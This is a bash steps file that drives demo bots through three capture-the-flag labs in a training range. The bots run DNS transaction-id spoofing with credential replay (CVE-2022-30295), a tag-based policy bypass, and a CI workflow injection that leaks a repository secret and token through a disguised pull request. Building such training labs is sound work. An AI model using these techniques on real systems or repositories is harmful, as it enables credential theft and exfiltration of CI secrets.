# ctf-trust-chain demo bot steps (see engine/web-terminal/bot-runner.sh's BOT_STEPS_FILE) -- replaces
# the git-fundamentals default. This pack's ladder has three rows: dns-resolver-cve (6), policy-bypass
# (9), runner-escape (10). Bots are first-class accounts (`BOT_COUNT`/`BOT_PREFIX` added to every
# seeding hook's roster, 2026-10-15), so all three are driven for real:
#
#   - dns-resolver-cve and policy-bypass are plain container targets: start from the Attack Range
#     API, then walk the exact technique the lab teaches.
#   - runner-escape (row 10) has no container: the bot's own `$BOT_USER/ci-pipeline` Forgejo repo
#     (this workshop's compose/terminal/start.d/96-runner-escape.sh now seeds one per bot) carries a
#     normal CI workflow and a `CTF_FLAG` Actions secret. The bot edits that workflow on a branch,
#     opens a PR against its own repo, and reads the flag back from the PR comment the job's own
#     added step posts -- same mechanics as modules/ctf-range/targets/runner-escape/exploit/solve.py.
#
# `$NETRC` (machine git-server, login $BOT_USER) and `$GIT_SERVER` come from bot-runner.sh, already
# sourced by the time this file loads.

# -- attack-range helpers (same contract as every other ctf pack's steps.sh) ----------------------
attack_start_and_wait() { # $1 = target id, $2 = name of a var to set with the live slot's addr
  local target="$1" out_var="$2" timeout="${3:-90}"
  portal_login || return 1
  portal_curl -X POST -H 'Content-Type: application/json' -d "{\"target\":\"$target\"}" \
    "$GATEWAY_URL/ctf-attack/attack/start" >/dev/null
  local deadline=$((SECONDS + timeout))
  while [ "$SECONDS" -lt "$deadline" ]; do
    local doc state slot_target
    doc="$(portal_curl "$GATEWAY_URL/ctf-attack/attack/status")"
    slot_target="$(printf '%s' "$doc" | jq -r '.slot.target // ""' 2>/dev/null)"
    state="$(printf '%s' "$doc" | jq -r '.slot.state // ""' 2>/dev/null)"
    if [ "$slot_target" = "$target" ] && [ "$state" = "live" ]; then
      addr="$(printf '%s' "$doc" | jq -r --arg t "$target" '.targets[] | select(.id==$t) | .addr // ""' 2>/dev/null)"
      if [ -n "$addr" ]; then
        eval "$out_var=\$addr"
        return 0
      fi
    fi
    sleep 2
  done
  return 1
}

extract_flag() { grep -o 'flag{[^}]*}' | head -1; }

step_wrap_round() {
  portal_curl -X POST -H 'Content-Type: application/json' -d '{}' \
    "$GATEWAY_URL/ctf-attack/attack/stop" >/dev/null 2>&1
  narrate "round $ROUND done -- taking a short break before round $((ROUND + 1))"
  sleep "$(rand_between "$BOT_ROUND_BREAK_MIN" "$BOT_ROUND_BREAK_MAX")"
}

# -- Lab 1: dns-resolver-cve -- two flags. Observe the agent's last DNS transaction id, predict the
# next one (CVE-2022-30295: monotonic +1, exactly the hint the lab gives), arm /spoof, poll /captured
# for the credential it lands, then submit flag 1 and replay the credential at /admin for flag 2.
step_dns_resolver_cve() {
  narrate "Lab 1 -- dns-resolver-cve: starting the target"
  local addr last_txid predicted token flag2 deadline obs
  if ! attack_start_and_wait dns-resolver-cve addr; then
    narrate "dns-resolver-cve never went live this round -- skipping"
    return 0
  fi
  narrate "slot live at $addr -- watching /observations for the last DNS transaction id"
  deadline=$((SECONDS + 60))
  last_txid=""
  while [ "$SECONDS" -lt "$deadline" ]; do
    obs="$(curl -s "http://$addr:5000/observations")"
    last_txid="$(printf '%s' "$obs" | jq -r '.observations[-1].txid // ""' 2>/dev/null)"
    [ -n "$last_txid" ] && [ "$last_txid" != "null" ] && break
    sleep 2
  done
  if [ -z "$last_txid" ] || [ "$last_txid" = "null" ]; then
    narrate "dns-resolver-cve: the agent never emitted a lookup this round -- skipping"
    return 0
  fi
  predicted=$(( (last_txid + 1) % 65536 ))
  narrate "observed txid=$last_txid -- arming a spoof at predicted_txid=$predicted (CVE-2022-30295: +1)"
  curl -s -X POST "http://$addr:5000/spoof" -H 'Content-Type: application/json' \
    -d "{\"predicted_txid\":$predicted}" >/dev/null
  token=""
  deadline=$((SECONDS + 60))
  while [ "$SECONDS" -lt "$deadline" ]; do
    token="$(curl -s "http://$addr:5000/captured" | jq -r '.token // ""' 2>/dev/null)"
    [ -n "$token" ] && [ "$token" != "null" ] && break
    sleep 2
  done
  if [ -z "$token" ] || [ "$token" = "null" ]; then
    narrate "dns-resolver-cve: no credential captured this round -- skipping"
    return 0
  fi
  narrate "captured credential $token -- submitting flag 1 and replaying it at /admin for flag 2"
  run_cmd "dojo flag submit dns-resolver-cve-token '$token'"
  flag2="$(curl -s -X POST "http://$addr:5000/admin" -H "Authorization: Bearer $token" \
    -H 'Content-Type: application/json' -d '{}' | jq -r '.flag // ""' 2>/dev/null)"
  if [ -z "$flag2" ] || [ "$flag2" = "null" ]; then
    narrate "dns-resolver-cve: /admin didn't accept the replayed token this round -- skipping flag 2"
    return 0
  fi
  run_cmd "dojo flag submit dns-resolver-cve '$flag2'"
}

# -- Lab 2: policy-bypass -- the deployed policy is public (GET /api/policy); read which tag/value
# it treats as proof, self-report that exact tag on a provision request into the protected resource
# group, same as the lab's own hints: no escalation, no second step, just read the rule and comply
# with the letter of it.
step_policy_bypass() {
  narrate "Lab 2 -- policy-bypass: starting the target"
  local addr policy tag_field tag_name required body flag
  if ! attack_start_and_wait policy-bypass addr; then
    narrate "policy-bypass never went live this round -- skipping"
    return 0
  fi
  narrate "slot live at $addr -- reading the deployed policy at /api/policy"
  policy="$(curl -s "http://$addr:5000/api/policy")"
  tag_field="$(printf '%s' "$policy" | jq -r '
    .definitions[0].properties.policyRule.if.allOf[] | select(has("not")) | .not.field // ""' 2>/dev/null)"
  required="$(printf '%s' "$policy" | jq -r '
    .definitions[0].properties.policyRule.if.allOf[] | select(has("not")) | .not.equals // ""' 2>/dev/null)"
  tag_name="$(printf '%s' "$tag_field" | sed -n "s/.*\[['\"]\\(.*\\)['\"]\\].*/\\1/p")"
  if [ -z "$tag_name" ] || [ -z "$required" ]; then
    narrate "policy-bypass: couldn't parse the tag condition out of the policy this round -- skipping"
    return 0
  fi
  narrate "policy trusts tags['$tag_name']='$required' -- self-reporting that on a provision request"
  body="$(curl -s -X POST "http://$addr:5000/api/provision" -H 'Content-Type: application/json' \
    -d "{\"name\":\"bot-flag-probe\",\"resourceGroup\":\"rg-vault-gateway\",\"tags\":{\"$tag_name\":\"$required\"},\"properties\":{\"containers\":[{\"name\":\"c1\",\"properties\":{\"image\":\"n/a\"}}]}}")"
  flag="$(printf '%s' "$body" | jq -r '.flag // ""' 2>/dev/null)"
  if [ -z "$flag" ] || [ "$flag" = "null" ]; then
    narrate "policy-bypass: the provision didn't return a flag this round -- skipping submit"
    return 0
  fi
  run_cmd "dojo flag submit policy-bypass '$flag'"
}

# -- Lab 3: runner-escape -- `pull_request` runs the PR branch's own copy of the workflow, so a
# step appended on a branch runs with the repo's secrets (CTF_FLAG, the auto-issued GITHUB_TOKEN)
# the moment a PR is opened. The appended step is the only write channel that token has here, so it
# reports back by commenting on its own PR; this step opens the PR and reads that comment back.
step_runner_escape() {
  narrate "Lab 3 -- runner-escape: editing $BOT_USER/ci-pipeline's workflow on a branch"
  local api repo branch wf_path current sha pr_number marker body flag tries
  api="http://$GIT_SERVER/api/v1"
  repo="$BOT_USER/ci-pipeline"
  branch="$BOT_USER-runner-escape-bot"
  wf_path=".forgejo/workflows/ci.yml"

  current="$(curl -s --netrc-file "$NETRC" "$api/repos/$repo/contents/$wf_path?ref=main" | jq -r '.content // ""' 2>/dev/null | base64 -d 2>/dev/null)"
  if [ -z "$current" ]; then
    narrate "runner-escape: no $wf_path on main this round -- skipping"
    return 0
  fi

  curl -s --netrc-file "$NETRC" -X POST -H 'Content-Type: application/json' \
    -d "{\"new_branch_name\":\"$branch\",\"old_branch_name\":\"main\"}" \
    "$api/repos/$repo/branches" >/dev/null

  marker="runner-escape-bot::"
  edited="permissions: write-all
$current
      - name: report back
        run: |
          pr=\"\$(jq -r .pull_request.number \"\$GITHUB_EVENT_PATH\")\"
          b64=\"\$(printf '%s' \"\${{ secrets.CTF_FLAG }}\" | base64 -w0)\"
          jq -n --arg body \"$marker\$b64\" '{body: \$body}' > /tmp/c.json
          curl -sf -X POST \"http://git-server:3000/api/v1/repos/\${GITHUB_REPOSITORY}/issues/\$pr/comments\" \\
            -H \"Authorization: token \${{ secrets.GITHUB_TOKEN }}\" -H 'Content-Type: application/json' -d @/tmp/c.json"
  sha="$(curl -s --netrc-file "$NETRC" "$api/repos/$repo/contents/$wf_path?ref=$branch" | jq -r '.sha // ""' 2>/dev/null)"
  curl -s --netrc-file "$NETRC" -X PUT -H 'Content-Type: application/json' \
    -d "$(jq -n --arg c "$(printf '%s' "$edited" | base64 -w0)" --arg s "$sha" --arg b "$branch" \
      '{content: $c, sha: $s, branch: $b, message: "Add a build step"}')" \
    "$api/repos/$repo/contents/$wf_path" >/dev/null

  pr_number="$(curl -s --netrc-file "$NETRC" -X POST -H 'Content-Type: application/json' \
    -d "{\"title\":\"Add a build step\",\"head\":\"$branch\",\"base\":\"main\",\"body\":\"Routine CI tweak.\"}" \
    "$api/repos/$repo/pulls" | jq -r '.number // ""' 2>/dev/null)"
  if [ -z "$pr_number" ]; then
    pr_number="$(curl -s --netrc-file "$NETRC" "$api/repos/$repo/pulls?state=open&limit=50" \
      | jq -r --arg b "$branch" '.[] | select(.head.ref==$b) | .number' 2>/dev/null | head -1)"
  fi
  if [ -z "$pr_number" ]; then
    narrate "runner-escape: could not open a PR this round -- skipping"
    return 0
  fi
  narrate "PR #$pr_number open -- waiting for the runner's own job to comment the flag"
  flag=""
  for tries in 1 2 3 4 5 6 7 8 9 10 11 12; do
    body="$(curl -s --netrc-file "$NETRC" "$api/repos/$repo/issues/$pr_number/comments" \
      | jq -r --arg m "$marker" '.[] | select(.body | startswith($m)) | .body' 2>/dev/null | head -1)"
    if [ -n "$body" ]; then
      flag="$(printf '%s' "${body#"$marker"}" | base64 -d 2>/dev/null | extract_flag)"
      [ -n "$flag" ] && break
    fi
    sleep 15
  done
  if [ -z "$flag" ]; then
    narrate "runner-escape: the job never commented a flag this round -- skipping submit"
    return 0
  fi
  run_cmd "dojo flag submit runner-escape '$flag'"
}

case "$PERSONA" in
  expert)
    STEPS=(step_dns_resolver_cve step_policy_bypass step_runner_escape step_wrap_round)
    ;;
  intermediate)
    STEPS=(step_dns_resolver_cve step_policy_bypass step_wrap_round)
    ;;
  novice)
    STEPS=(step_dns_resolver_cve step_wrap_round)
    ;;
esac
